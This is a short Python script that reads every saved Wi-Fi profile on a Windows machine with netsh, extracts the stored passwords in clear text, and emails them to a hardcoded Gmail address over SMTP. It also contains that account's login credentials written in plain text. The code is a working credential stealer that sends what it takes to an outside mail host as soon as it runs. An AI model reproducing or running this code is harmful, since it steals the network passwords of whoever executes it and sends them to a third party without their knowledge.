import smtplib
import subprocess
from email.message import EmailMessage

def extract():
    text = ""
    data = subprocess.check_output(['netsh','wlan', 'show', 'profile']).decode('cp857').split('\n')
    wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]
    for wifi in wifis:
        results = subprocess.check_output(['netsh','wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp857').split('\n')
        results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
        try:
            text += f"Profile: {wifi}, Password: {results[0]}\n"
        except:
            text += "Given task couldn't be performed."
    return text

def sendMail(content):
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login('napalmkokusu@gmail.com', 'CdjX0woSZvOd0OwF')
    msg = EmailMessage()
    msg['from'] = 'napalmkokusu@gmail.com'
    msg['to'] = 'napalmkokusu@gmail.com'
    msg['subject'] = 'message'
    msg.set_content(content)
    server.send_message(msg)
    server.quit()

sendMail(extract())